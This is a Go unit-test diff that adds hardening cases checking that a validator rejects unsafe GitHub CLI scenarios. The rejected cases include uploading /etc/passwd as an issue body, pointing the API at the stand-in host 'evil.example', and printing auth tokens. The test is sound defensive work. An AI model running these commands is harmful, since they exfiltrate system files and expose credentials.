@@ -401,3 +401,21 @@ func TestValidate_Round3Bypasses(t *testing.T) {
 		})
 	}
 }
+
+func TestValidate_Round4Hardening(t *testing.T) {
+	for _, s := range []*Scenario{
+		ghScenario("H1", "", "api", "-X", "POST", "repos/{{.RepoW}}/issues", "-F", "body=@/etc/passwd"),
+		ghScenario("H1b", "", "api", "repos/{{.RepoW}}/issues", "-f", "q=@x"),
+		ghScenario("H2", "", "api", "--hostname", "evil.example", "repos/{{.RepoW}}/issues"),
+		ghScenario("H3", "", "auth", "status", "--show-token"),
+		ghScenario("H3b", "", "auth", "token"),
+		ghScenario("H3c", "A", "pr", "list", "--show-token=true"),
+	} {
+		t.Run(s.ID, func(t *testing.T) {
+			if errs := Validate(withScenarios(s), nil); len(errs) == 0 {
+				t.Fatalf("accepted")
+			}
+		})
+	}
+	requireNoErr(t, Validate(withScenarios(ghScenario("OK", "", "auth", "status")), nil))
+}
